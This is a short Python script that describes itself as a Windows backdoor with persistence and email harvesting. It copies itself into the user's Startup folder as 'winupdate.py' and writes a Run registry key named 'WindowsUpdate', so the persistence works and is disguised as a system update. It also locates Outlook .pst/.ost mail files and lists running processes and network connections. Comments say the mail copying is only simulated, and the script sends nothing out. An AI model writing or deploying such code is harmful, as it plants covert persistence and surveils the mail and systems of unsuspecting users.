import os
import sys
import winreg
import getpass
import smtplib
from shutil import copy2

# Simple backdoor with persistence and email harvesting
def install_backdoor():
    username = getpass.getuser()
    install_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winupdate.py"
    
    # Copy itself to startup folder
    copy2(sys.argv[0], install_path)
    
    # Add registry persistence
    key = winreg.HKEY_CURRENT_USER
    key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    try:
        reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, install_path)
        winreg.CloseKey(reg_key)
    except OSError:
        pass
    
    print("[+] Persistence mechanism installed")

def harvest_emails():
    # This would simulate email harvesting - in real scenario would target Outlook files
    print("[*] Searching for email data...")
    outlook_path = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Microsoft\\Outlook"
    
    if os.path.exists(outlook_path):
        print(f"[+] Found Outlook data at {outlook_path}")
        # Simulate copying .pst/.ost files
        for file in os.listdir(outlook_path):
            if file.endswith(('.pst', '.ost')):
                print(f"[+] Found email file: {file}")
    else:
        print("[-] No Outlook data found")

def harvest_user_info():
    print("[*] Gathering user information...")
    # Simulate gathering user data
    print(f"[+] Username: {getpass.getuser()}")
    print("[+] Running processes:")
    os.system('tasklist')
    print("\n[+] Network connections:")
    os.system('netstat -ano')

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--install":
        install_backdoor()
    else:
        harvest_emails()
        harvest_user_info()
        input("Press enter to exit...") 